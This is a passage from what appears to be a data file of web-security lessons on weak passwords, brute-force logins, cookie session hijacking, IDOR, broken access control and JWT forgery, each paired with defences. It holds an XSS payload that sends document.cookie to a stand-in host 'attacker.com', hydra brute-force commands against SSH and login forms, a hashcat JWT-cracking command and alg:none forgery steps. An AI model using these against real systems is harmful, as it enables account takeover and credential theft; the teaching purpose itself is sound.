        <p><b>5. Invalidate sessions after logout.</b></p>

        <p><b>6. Protect cookies using HttpOnly and Secure flags.</b></p>

        <p><b>7. Use strong password hashing algorithms such as bcrypt or Argon2.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Monitor failed login attempts

Apply CAPTCHA mechanisms

Use secure session storage

Enable login alerts

Monitor suspicious authentication activity</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Hydra
Medusa
Nuclei</code></pre>

        <h3>Difference Between Authentication and Authorization:</h3>

        <p><b>Authentication:</b> Verifies the identity of the user.</p>

        <p><b>Authorization:</b> Determines what the authenticated user is allowed to access.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may take over accounts, access administrative panels, steal sensitive information, perform fraudulent actions, or compromise entire applications.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Broken Authentication is considered extremely critical because compromised authentication mechanisms directly expose user accounts and sensitive systems to unauthorized access.</p>
    `
},


{
    "id": 19,
    "title": "Weak Password Attack",
    "summary": `
        <p><b>Weak Password Attack</b> is a common security attack in which attackers exploit weak, predictable, or reused passwords to gain unauthorized access to user accounts, systems, or applications.</p>

        <p>This attack is highly successful because many users continue to use simple passwords, common words, keyboard patterns, or reused credentials across multiple platforms.</p>

        <h3>How Does the Attack Occur?</h3>

        <p>The attack occurs when attackers attempt to authenticate using passwords that are easy to guess or commonly used.</p>

        <h3>Common Weak Password Examples:</h3>

        <pre><code>123456
password
admin
qwerty
welcome123</code></pre>

        <h3>Why are Weak Passwords Dangerous?</h3>

        <p>Weak passwords allow attackers to compromise accounts quickly using automated tools, brute force attacks, or credential stuffing techniques.</p>

        <h3>Common Weak Password Patterns:</h3>

        <pre><code>Simple numbers

Dictionary words

Keyboard sequences

Personal information

Repeated passwords</code></pre>

        <h3>Simple Brute Force Example:</h3>

        <pre><code>admin:123456
admin:password
admin:qwerty</code></pre>

        <p>The attacker repeatedly tries common passwords until authentication succeeds.</p>

        <h3>Credential Stuffing Example:</h3>

        <p>Attackers use leaked username and password combinations from previous data breaches.</p>

        <pre><code>user@example.com : Password123</code></pre>

        <h3>Password Spraying Attack:</h3>

        <pre><code>Spring2024!
Welcome123
Company@123</code></pre>

        <p>Attackers try a few common passwords against many accounts to avoid triggering account lockouts.</p>

        <h3>Dictionary Attack:</h3>

        <p>Attackers use large wordlists containing common passwords and variations.</p>

        <pre><code>rockyou.txt</code></pre>

        <h3>Hybrid Password Attack:</h3>

        <pre><code>password123
admin2024
welcome@1</code></pre>

        <p>The attacker combines dictionary words with numbers or symbols.</p>

        <h3>Why is the Attack Effective?</h3>

        <p>Many users select passwords that are short, predictable, reused, or based on personal information.</p>

        <h3>Common Attack Targets:</h3>

        <pre><code>Email accounts

Admin panels

VPN logins

Cloud services

Social media accounts</code></pre>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-site.com

username=admin&password=123456</code></pre>

        <h3>Automated Password Attack Tools:</h3>

        <pre><code>Hydra
Medusa
Burp Suite Intruder
John the Ripper
Hashcat</code></pre>

        <h3>Indicators of Weak Password Vulnerabilities:</h3>

        <p>1. No password complexity requirements.</p>
        <p>2. Missing account lockout mechanisms.</p>
        <p>3. Lack of Multi-Factor Authentication (MFA).</p>
        <p>4. Common passwords accepted by the system.</p>
        <p>5. Unlimited login attempts.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Account takeover.</p>
        <p>2. Unauthorized system access.</p>
        <p>3. Data theft.</p>
        <p>4. Privilege escalation.</p>
        <p>5. Lateral movement inside networks.</p>

        <h3>Weak Password Policy Example:</h3>

        <pre><code>Password length: 4 characters

No uppercase requirement

No special characters

No password expiration</code></pre>

        <h3>Strong Password Example:</h3>

        <pre><code>T9#vL2@pQ7!x</code></pre>

        <p>Strong passwords are long, random, and difficult to predict.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Enforce strong password complexity policies.</b></p>

        <p><b>2. Require long passwords.</b></p>

        <p><b>3. Enable Multi-Factor Authentication (MFA).</b></p>

        <p><b>4. Prevent password reuse.</b></p>

        <p><b>5. Apply account lockout mechanisms.</b></p>

        <p><b>6. Implement rate limiting for login attempts.</b></p>

        <p><b>7. Monitor suspicious authentication activity.</b></p>

        <h3>Password Storage Security:</h3>

        <pre><code>bcrypt
Argon2
PBKDF2</code></pre>

        <p>Applications should store passwords using strong hashing algorithms.</p>

        <h3>Common Security Best Practices:</h3>

        <pre><code>Use password managers

Enable MFA

Monitor breach databases

Train users about password security

Apply login alerts</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Hydra
Medusa
John the Ripper
Hashcat
Burp Suite</code></pre>

        <h3>Difference Between Brute Force and Password Spraying:</h3>

        <p><b>Brute Force:</b> Tries many passwords against one account.</p>

        <p><b>Password Spraying:</b> Tries one common password against many accounts.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may steal accounts, access sensitive systems, compromise internal networks, deploy malware, or perform fraudulent activities using compromised credentials.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Weak Password vulnerabilities are considered highly critical because compromised credentials often provide direct access to sensitive accounts, systems, and confidential information.</p>
    `
},


{
    "id": 20,
    "title": "Brute Force Login Attack",
    "summary": `
        <p><b>Brute Force Login Attack</b> is a common authentication attack in which attackers repeatedly attempt different username and password combinations until valid credentials are discovered.</p>

        <p>This attack targets login systems with weak authentication protections, missing rate limiting, or weak password policies.</p>

        <h3>How Does the Attack Occur?</h3>

        <p>The attacker automates repeated login attempts against a target authentication system.</p>

        <h3>Common Attack Targets:</h3>

        <pre><code>Admin panels

Email accounts

VPN portals

SSH services

Web applications</code></pre>

        <h3>Simple Brute Force Example:</h3>

        <pre><code>admin:admin
admin:123456
admin:password
admin:qwerty</code></pre>

        <p>The attacker continuously tries different password combinations until authentication succeeds.</p>

        <h3>Why is Brute Force Dangerous?</h3>

        <p>Successful brute force attacks may lead to account takeover, unauthorized access, data theft, privilege escalation, or full system compromise.</p>

        <h3>Types of Brute Force Attacks:</h3>

        <p>1. Traditional Brute Force.</p>
        <p>2. Dictionary Attack.</p>
        <p>3. Credential Stuffing.</p>
        <p>4. Password Spraying.</p>
        <p>5. Hybrid Attacks.</p>

        <h3>Dictionary Attack Example:</h3>

        <pre><code>password
welcome123
letmein
admin123</code></pre>

        <p>The attacker uses wordlists containing common passwords.</p>

        <h3>Credential Stuffing Example:</h3>

        <pre><code>user@example.com : Password123</code></pre>

        <p>Attackers reuse leaked credentials from previous breaches.</p>

        <h3>Password Spraying Example:</h3>

        <pre><code>Company2024!
Welcome123
Spring2024!</code></pre>

        <p>Attackers try a few common passwords against many accounts to avoid detection.</p>

        <h3>Hybrid Attack Example:</h3>

        <pre><code>admin2024
password@1
welcome123!</code></pre>

        <p>The attacker combines dictionary words with numbers and symbols.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-site.com

username=admin&password=123456</code></pre>

        <h3>Automated Brute Force Tools:</h3>

        <pre><code>Hydra
Medusa
Burp Suite Intruder
Patator
Ncrack</code></pre>

        <h3>Indicators of Brute Force Vulnerabilities:</h3>

        <p>1. Missing account lockout mechanisms.</p>
        <p>2. Unlimited login attempts.</p>
        <p>3. Weak password policies.</p>
        <p>4. Missing CAPTCHA protection.</p>
        <p>5. Lack of Multi-Factor Authentication (MFA).</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Account takeover.</p>
        <p>2. Administrative access.</p>
        <p>3. Data theft.</p>
        <p>4. Privilege escalation.</p>
        <p>5. Internal network access.</p>

        <h3>Brute Force Against SSH:</h3>

        <pre><code>hydra -l root -P passwords.txt ssh://target.com</code></pre>

        <p>Attackers often target exposed SSH services using automated tools.</p>

        <h3>Brute Force Against Web Login Forms:</h3>

        <pre><code>hydra -L users.txt -P passwords.txt target.com http-post-form</code></pre>

        <h3>Common Weak Password Examples:</h3>

        <pre><code>123456
password
admin
qwerty
welcome123</code></pre>

        <h3>Safe Authentication Example:</h3>

        <pre><code>// Secure Authentication Controls

Enable account lockout

Apply rate limiting

Use MFA

Require strong passwords</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Implement account lockout mechanisms.</b></p>

        <p><b>2. Apply rate limiting on login attempts.</b></p>

        <p><b>3. Use CAPTCHA systems.</b></p>

        <p><b>4. Enforce strong password policies.</b></p>

        <p><b>5. Enable Multi-Factor Authentication (MFA).</b></p>

        <p><b>6. Monitor suspicious login activity.</b></p>

        <p><b>7. Alert users about unusual login attempts.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict login endpoints

Monitor authentication logs

Block suspicious IP addresses

Use Web Application Firewall (WAF)

Enable login anomaly detection</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Hydra
Medusa
Burp Suite
Ncrack
OWASP ZAP</code></pre>

        <h3>Difference Between Brute Force and Credential Stuffing:</h3>

        <p><b>Brute Force:</b> Attempts many password combinations against accounts.</p>

        <p><b>Credential Stuffing:</b> Uses previously leaked valid credentials.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may compromise sensitive accounts, steal confidential data, gain administrative access, deploy malware, or pivot deeper into internal systems.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Brute Force Login vulnerabilities are considered highly critical because weak authentication protections may directly expose sensitive user and administrative accounts.</p>
    `
},


{
    "id": 21,
    "title": "Session Hijacking Using Cookies",
    "summary": `
        <p><b>Session Hijacking Using Cookies</b> is a critical attack in which attackers steal or manipulate session cookies to impersonate authenticated users and gain unauthorized access to web applications.</p>

        <p>Web applications commonly use cookies to maintain authenticated sessions. If attackers obtain valid session cookies, they may bypass the login process entirely.</p>

        <h3>How Does the Attack Occur?</h3>

        <p>The attack occurs when attackers steal, predict, intercept, or manipulate authentication cookies used by the application.</p>

        <h3>What are Session Cookies?</h3>

        <p>Session cookies are identifiers stored inside the browser that allow the server to recognize authenticated users.</p>

        <pre><code>Cookie: PHPSESSID=abc123xyz</code></pre>

        <h3>Why are Session Cookies Important?</h3>

        <p>Whoever owns a valid session cookie may gain access to the victim's authenticated account without knowing the password.</p>

        <h3>Common Methods of Cookie Theft:</h3>

        <p>1. Cross Site Scripting (XSS).</p>
        <p>2. Packet sniffing on insecure HTTP connections.</p>
        <p>3. Malware or browser compromise.</p>
        <p>4. Session fixation attacks.</p>
        <p>5. Predictable session identifiers.</p>

        <h3>Cookie Theft Using XSS:</h3>

        <pre><code>&lt;script&gt;
fetch('http://attacker.com/steal?cookie=' + document.cookie)
&lt;/script&gt;</code></pre>

        <p>If cookies are not protected with the HttpOnly flag, attackers may steal them through JavaScript.</p>

        <h3>Using the Stolen Cookie:</h3>

        <pre><code>Cookie: PHPSESSID=abc123xyz</code></pre>

        <p>The attacker inserts the stolen cookie into their browser or HTTP requests.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /dashboard HTTP/1.1
Host: vulnerable-site.com
Cookie: PHPSESSID=abc123xyz</code></pre>

        <h3>Session Fixation Attack:</h3>

        <pre><code>http://target.com/login?SESSIONID=attacker123</code></pre>

        <p>The attacker forces the victim to authenticate using a known session identifier.</p>

        <h3>Predictable Session IDs:</h3>

        <pre><code>SESSIONID=1001
SESSIONID=1002
SESSIONID=1003</code></pre>

        <p>Weak or sequential session IDs may allow attackers to guess active sessions.</p>

        <h3>Packet Sniffing Example:</h3>

        <p>If the application uses HTTP instead of HTTPS, attackers may intercept cookies over the network.</p>

        <pre><code>Cookie: SESSIONID=user123</code></pre>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Account takeover.</p>
        <p>2. Administrative access.</p>
        <p>3. Access to sensitive data.</p>
        <p>4. Fraudulent actions using victim accounts.</p>
        <p>5. Privilege escalation.</p>

        <h3>Indicators of Session Hijacking Vulnerabilities:</h3>

        <p>1. Cookies missing HttpOnly flag.</p>
        <p>2. Cookies missing Secure flag.</p>
        <p>3. Predictable session identifiers.</p>
        <p>4. Session IDs exposed in URLs.</p>
        <p>5. Sessions not invalidated after logout.</p>

        <h3>Weak Cookie Example:</h3>

        <pre><code>Set-Cookie: SESSIONID=12345</code></pre>

        <p>The session identifier is short and predictable.</p>

        <h3>Secure Cookie Example:</h3>

        <pre><code>Set-Cookie: SESSIONID=random_secure_token;
HttpOnly;
Secure;
SameSite=Strict</code></pre>

        <p>The cookie uses strong security protections.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Login systems

Admin panels

Banking applications

E-commerce websites

Cloud dashboards</code></pre>

        <h3>Session Replay Attack:</h3>

        <p>Attackers reuse stolen cookies to replay authenticated requests.</p>

        <h3>Example of Safe Session Management:</h3>

        <pre><code>// Secure Session Controls

Use random session IDs

Regenerate sessions after login

Expire sessions automatically

Protect cookies with security flags</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Use HTTPS for all authenticated traffic.</b></p>

        <p><b>2. Enable HttpOnly cookies.</b></p>

        <p><b>3. Enable Secure cookies.</b></p>

        <p><b>4. Use SameSite cookie protection.</b></p>

        <p><b>5. Generate long random session identifiers.</b></p>

        <p><b>6. Regenerate sessions after login.</b></p>

        <p><b>7. Expire sessions after inactivity or logout.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Monitor session anomalies

Detect unusual IP changes

Apply Web Application Firewall (WAF)

Enable login alerts

Monitor suspicious session reuse</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Wireshark
Ettercap
Nuclei</code></pre>

        <h3>Difference Between Session Hijacking and Session Fixation:</h3>

        <p><b>Session Hijacking:</b> The attacker steals an existing authenticated session.</p>

        <p><b>Session Fixation:</b> The attacker forces the victim to use a session controlled by the attacker.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may bypass authentication completely, steal confidential information, perform actions as legitimate users, compromise administrative accounts, or conduct financial fraud.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Session Hijacking vulnerabilities are considered extremely critical because stolen session cookies may provide immediate unauthorized access to authenticated accounts without requiring passwords.</p>
    `
},


{
    "id": 22,
    "title": "Insecure Direct Object Reference (IDOR)",
    "summary": `
        <p><b>Insecure Direct Object Reference (IDOR)</b> is a critical access control vulnerability that occurs when applications expose internal object references without properly verifying user authorization.</p>

        <p>This vulnerability allows attackers to access, modify, or delete resources belonging to other users by manipulating identifiers such as user IDs, file names, order numbers, or database records.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application trusts user-supplied object identifiers without validating ownership or permissions.</p>

        <h3>Common Direct Object References:</h3>

        <pre><code>User IDs

Order numbers

File names

Invoice IDs

Document identifiers</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>http://target.com/profile?id=1001</code></pre>

        <p>The application displays profile information based only on the provided user ID.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/profile?id=1002</code></pre>

        <p>The attacker changes the identifier to access another user's profile.</p>

        <h3>Why is IDOR Dangerous?</h3>

        <p>Successful exploitation may allow attackers to access sensitive data, modify resources, delete information, or perform unauthorized actions on behalf of other users.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Accessing other user accounts.</p>
        <p>2. Viewing confidential documents.</p>
        <p>3. Modifying sensitive records.</p>
        <p>4. Deleting resources.</p>
        <p>5. Privilege escalation.</p>

        <h3>Example of Vulnerable Backend Logic:</h3>

        <pre><code>// Vulnerable Example

$user = database.getUser($_GET['id']);

return $user;</code></pre>

        <p>The application fetches data directly without checking authorization.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /account?id=1002 HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>User profiles

Download systems

Invoice portals

API endpoints

Administrative dashboards</code></pre>

        <h3>IDOR in APIs:</h3>

        <pre><code>GET /api/users/1001</code></pre>

        <p>Attackers may modify API object identifiers to access unauthorized resources.</p>

        <h3>File Access IDOR Example:</h3>

        <pre><code>http://target.com/download?file=invoice1001.pdf</code></pre>

        <p>Changing the filename may expose documents belonging to other users.</p>

        <h3>Mass Enumeration Example:</h3>

        <pre><code>id=1001
id=1002
id=1003</code></pre>

        <p>Attackers automate enumeration to collect large amounts of sensitive data.</p>

        <h3>Indicators of IDOR Vulnerabilities:</h3>

        <p>1. Sequential numeric identifiers.</p>
        <p>2. Missing authorization checks.</p>
        <p>3. Predictable object references.</p>
        <p>4. Sensitive data exposed through URLs or APIs.</p>
        <p>5. Access control logic only enforced on the client side.</p>

        <h3>Horizontal Privilege Escalation:</h3>

        <p>Attackers access resources belonging to users with the same privilege level.</p>

        <h3>Vertical Privilege Escalation:</h3>

        <p>Attackers access administrative or higher-privileged resources.</p>

        <h3>Weak Authorization Example:</h3>

        <pre><code>if(user.isLoggedIn()) {
    return requestedData;
}</code></pre>

        <p>The application checks authentication only and ignores ownership validation.</p>

        <h3>Safe Authorization Example:</h3>

        <pre><code>// Secure Example

if(user.id == requestedObject.ownerId) {
    return requestedObject;
}</code></pre>

        <p>The application verifies resource ownership before granting access.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Enforce server-side authorization checks.</b></p>

        <p><b>2. Validate resource ownership for every request.</b></p>

        <p><b>3. Avoid exposing predictable identifiers.</b></p>

        <p><b>4. Use indirect object references or UUIDs.</b></p>

        <p><b>5. Apply least privilege access controls.</b></p>

        <p><b>6. Validate permissions on APIs and backend systems.</b></p>

        <p><b>7. Monitor suspicious enumeration activity.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Apply Role-Based Access Control (RBAC)

Monitor access logs

Restrict administrative endpoints

Enable anomaly detection

Apply API authorization controls</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Postman
Nuclei
Autorize Extension</code></pre>

        <h3>Difference Between Authentication and Authorization:</h3>

        <p><b>Authentication:</b> Verifies user identity.</p>

        <p><b>Authorization:</b> Determines what resources the user may access.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may expose confidential records, compromise customer accounts, access financial documents, modify sensitive data, or gain administrative capabilities.</p>

        <h3>Vulnerability Severity:</h3>

        <p>IDOR vulnerabilities are considered highly critical because missing authorization checks may directly expose sensitive user and administrative resources to unauthorized attackers.</p>
    `
},


{
    "id": 23,
    "title": "Broken Access Control",
    "summary": `
        <p><b>Broken Access Control</b> is a critical security vulnerability that occurs when applications fail to properly enforce restrictions on what authenticated or unauthenticated users are allowed to access.</p>

        <p>This vulnerability allows attackers to bypass authorization mechanisms and perform actions or access resources that should normally be restricted.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application does not correctly validate user permissions before granting access to sensitive functionality or data.</p>

        <h3>Common Access Control Weaknesses:</h3>

        <pre><code>Missing authorization checks

Client-side access control

Predictable resource identifiers

Privilege escalation flaws

Insecure API permissions</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>http://target.com/admin</code></pre>

        <p>A normal user accesses an administrative page without proper permission validation.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/admin/delete-user?id=1001</code></pre>

        <p>The attacker performs administrative actions without having administrative privileges.</p>

        <h3>Why is Broken Access Control Dangerous?</h3>

        <p>Successful exploitation may allow attackers to access sensitive data, modify critical resources, escalate privileges, or fully compromise the application.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Accessing restricted pages.</p>
        <p>2. Viewing confidential information.</p>
        <p>3. Modifying sensitive records.</p>
        <p>4. Deleting resources.</p>
        <p>5. Gaining administrative privileges.</p>

        <h3>Horizontal Privilege Escalation:</h3>

        <p>Attackers access resources belonging to users with the same privilege level.</p>

        <pre><code>http://target.com/account?id=1002</code></pre>

        <h3>Vertical Privilege Escalation:</h3>

        <p>Attackers gain access to higher-privileged administrative functionality.</p>

        <pre><code>http://target.com/admin/panel</code></pre>

        <h3>Client-Side Access Control Example:</h3>

        <pre><code>if(userRole == "admin") {
    showAdminButton();
}</code></pre>

        <p>The application relies only on client-side checks, which attackers can bypass.</p>

        <h3>Insecure API Access Example:</h3>

        <pre><code>GET /api/admin/users</code></pre>

        <p>The API endpoint lacks proper authorization validation.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /admin HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Forced Browsing Attack:</h3>

        <p>Attackers manually request hidden or restricted URLs.</p>

        <pre><code>/admin
/dashboard
/internal
/config</code></pre>

        <h3>Indicators of Broken Access Control:</h3>

        <p>1. Sensitive pages accessible without authorization.</p>
        <p>2. Missing permission checks on APIs.</p>
        <p>3. Role validation only enforced on the client side.</p>
        <p>4. Predictable administrative URLs.</p>
        <p>5. Unauthorized actions succeed.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Administrative panels

User management systems

APIs

File download systems

Payment systems</code></pre>

        <h3>Weak Authorization Example:</h3>

        <pre><code>if(user.isLoggedIn()) {
    allowAccess();
}</code></pre>

        <p>The application verifies authentication only and ignores authorization levels.</p>

        <h3>Safe Authorization Example:</h3>

        <pre><code>// Secure Example

if(user.role == "admin") {
    allowAccess();
}</code></pre>

        <p>The application validates user roles before granting access.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Enforce server-side authorization checks.</b></p>

        <p><b>2. Apply Role-Based Access Control (RBAC).</b></p>

        <p><b>3. Validate permissions for every request.</b></p>

        <p><b>4. Deny access by default.</b></p>

        <p><b>5. Avoid relying on client-side authorization.</b></p>

        <p><b>6. Protect API endpoints properly.</b></p>

        <p><b>7. Monitor suspicious privilege escalation attempts.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict administrative interfaces

Enable access logging

Apply least privilege permissions

Monitor API authorization failures

Use Web Application Firewall (WAF)</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Postman
Autorize Extension
Nuclei</code></pre>

        <h3>Difference Between IDOR and Broken Access Control:</h3>

        <p><b>IDOR:</b> Focuses on direct object reference manipulation.</p>

        <p><b>Broken Access Control:</b> Covers broader authorization failures across the application.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may gain unauthorized administrative access, expose sensitive records, modify application data, compromise user accounts, or completely take over critical systems.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Broken Access Control is considered extremely critical because authorization failures may directly expose sensitive functionality and administrative privileges to attackers.</p>
    `
},


{
    "id": 24,
    "title": "JWT Token Manipulation",
    "summary": `
        <p><b>JWT Token Manipulation</b> is a critical security vulnerability that occurs when applications improperly validate or securely implement JSON Web Tokens (JWTs), allowing attackers to modify, forge, or abuse authentication tokens.</p>

        <p>JWTs are commonly used for authentication and authorization in modern web applications and APIs. Weak JWT implementations may allow attackers to bypass authentication, escalate privileges, or impersonate other users.</p>

        <h3>What is a JWT?</h3>

        <p>JWT stands for <b>JSON Web Token</b>, which is a token format used to securely transfer authentication and authorization data between systems.</p>

        <h3>JWT Structure:</h3>

        <pre><code>HEADER.PAYLOAD.SIGNATURE</code></pre>

        <h3>Example JWT:</h3>

        <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.
signature</code></pre>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application fails to properly validate JWT signatures, algorithms, expiration times, or token integrity.</p>

        <h3>Common JWT Weaknesses:</h3>

        <pre><code>Weak signing secrets

Missing signature verification

Algorithm confusion

Accepting unsigned tokens

Exposed sensitive payload data</code></pre>

        <h3>JWT Payload Manipulation:</h3>

        <pre><code>{
  "user":"admin",
  "role":"admin"
}</code></pre>

        <p>Attackers modify the payload to escalate privileges.</p>

        <h3>Algorithm Confusion Attack:</h3>

        <pre><code>{
  "alg":"none"
}</code></pre>

        <p>Some vulnerable applications incorrectly accept unsigned tokens.</p>

        <h3>Unsigned JWT Example:</h3>

        <pre><code>HEADER.PAYLOAD.</code></pre>

        <p>If the server accepts tokens without validating signatures, attackers may forge arbitrary tokens.</p>

        <h3>Weak Secret Key Example:</h3>

        <pre><code>secret
password123
jwtsecret</code></pre>

        <p>Weak signing secrets may be cracked using brute force attacks.</p>

        <h3>Why is JWT Manipulation Dangerous?</h3>

        <p>Successful exploitation may allow attackers to bypass authentication, impersonate users, gain administrative access, or fully compromise APIs and applications.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>Authorization: Bearer eyJhbGciOi...</code></pre>

        <p>Attackers intercept and modify JWT tokens during requests.</p>

        <h3>JWT Privilege Escalation Example:</h3>

        <pre><code>{
  "username":"user",
  "role":"admin"
}</code></pre>

        <p>The attacker changes the role value to obtain administrative privileges.</p>

        <h3>Expired Token Validation Failure:</h3>

        <p>Some applications fail to verify token expiration timestamps.</p>

        <pre><code>"exp": 9999999999</code></pre>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Authentication bypass.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Account impersonation.</p>
        <p>4. Administrative access.</p>
        <p>5. API compromise.</p>

        <h3>Indicators of JWT Vulnerabilities:</h3>

        <p>1. JWTs accepted without valid signatures.</p>
        <p>2. Weak or guessable signing secrets.</p>
        <p>3. Sensitive data exposed inside payloads.</p>
        <p>4. Missing expiration validation.</p>
        <p>5. Algorithm confusion vulnerabilities.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>REST APIs

Authentication systems

Single Sign-On (SSO)

Mobile applications

Cloud services</code></pre>

        <h3>JWT Brute Force Example:</h3>

        <pre><code>hashcat -m 16500 jwt.txt wordlist.txt</code></pre>

        <p>Attackers attempt to crack weak JWT signing secrets.</p>

        <h3>Safe JWT Example:</h3>

        <pre><code>// Secure JWT Controls

Use strong secrets

Validate signatures

Verify expiration

Restrict algorithms</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Use strong random signing secrets.</b></p>

        <p><b>2. Always validate JWT signatures.</b></p>

        <p><b>3. Reject unsigned tokens.</b></p>

        <p><b>4. Restrict allowed algorithms.</b></p>

        <p><b>5. Validate token expiration and claims.</b></p>

        <p><b>6. Avoid storing sensitive data inside JWT payloads.</b></p>

        <p><b>7. Rotate secrets periodically.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Monitor suspicious token usage

Restrict API permissions

Apply secure key management

Use HTTPS for token transmission

Enable security logging</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
jwt_tool
Hashcat
OWASP ZAP
Nuclei</code></pre>

        <h3>Difference Between Session Cookies and JWTs:</h3>

        <p><b>Session Cookies:</b> Session data is stored on the server.</p>

        <p><b>JWTs:</b> Authentication data is stored inside signed tokens on the client side.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may bypass authentication systems, gain unauthorized administrative access, compromise APIs, impersonate users, or access sensitive cloud services.</p>

        <h3>Vulnerability Severity:</h3>

        <p>JWT Token Manipulation vulnerabilities are considered extremely critical because weak JWT validation may completely break authentication and authorization mechanisms.</p>
    `
},


{
    "id": 25,
    "title": "JWT None Algorithm Exploit",
    "summary": `
        <p><b>JWT None Algorithm Exploit</b> is a critical authentication vulnerability that occurs when applications incorrectly accept JSON Web Tokens (JWTs) using the <code>alg:none</code> algorithm without verifying a valid signature.</p>

        <p>This vulnerability allows attackers to forge arbitrary JWT tokens and bypass authentication or authorization mechanisms completely.</p>

        <h3>What is the None Algorithm?</h3>

        <p>JWT supports multiple signing algorithms used to verify token integrity.</p>

        <pre><code>HS256
RS256
ES256
none</code></pre>

        <p>The <code>none</code> algorithm indicates that the token is unsigned and should normally never be accepted in production environments.</p>

        <h3>JWT Structure:</h3>

        <pre><code>HEADER.PAYLOAD.SIGNATURE</code></pre>

        <h3>Normal Secure JWT Example:</h3>

        <pre><code>{
  "alg":"HS256",
  "typ":"JWT"
}</code></pre>

        <h3>Vulnerable JWT Header Example:</h3>

        <pre><code>{
  "alg":"none",
  "typ":"JWT"
}</code></pre>

        <p>The attacker changes the algorithm from a secure signing method to <code>none</code>.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the server trusts the JWT header and skips signature verification if the algorithm is set to <code>none</code>.</p>

        <h3>Unsigned JWT Example:</h3>

        <pre><code>HEADER.PAYLOAD.</code></pre>

        <p>The token does not contain a valid signature.</p>

        <h3>Privilege Escalation Example:</h3>

        <pre><code>{
  "username":"admin",
  "role":"admin"
}</code></pre>

        <p>The attacker forges a JWT payload containing administrative privileges.</p>

        <h3>Basic Exploitation Process:</h3>

        <p>1. Intercept a valid JWT token.</p>
        <p>2. Decode the token.</p>
        <p>3. Change the algorithm to <code>none</code>.</p>
        <p>4. Modify the payload.</p>
        <p>5. Remove the signature.</p>
        <p>6. Send the forged token to the server.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>Authorization: Bearer eyJhbGciOiJub25lIn0...</code></pre>

        <p>The attacker sends a forged unsigned token.</p>

        <h3>Why is the Vulnerability Dangerous?</h3>

        <p>Successful exploitation may allow attackers to bypass authentication, impersonate users, gain administrative access, or fully compromise APIs and web applications.</p>

        <h3>Indicators of Vulnerability:</h3>

        <p>1. Server accepts unsigned JWTs.</p>
        <p>2. Missing JWT signature validation.</p>
        <p>3. The application trusts user-controlled JWT headers.</p>
        <p>4. Authentication succeeds with modified tokens.</p>
        <p>5. JWT libraries improperly configured.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Authentication bypass.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Administrative access.</p>
        <p>4. API compromise.</p>
        <p>5. Account impersonation.</p>

        <h3>Common Vulnerable Systems:</h3>

        <pre><code>REST APIs

Authentication gateways

Single Sign-On systems

Cloud services

Mobile application backends</code></pre>

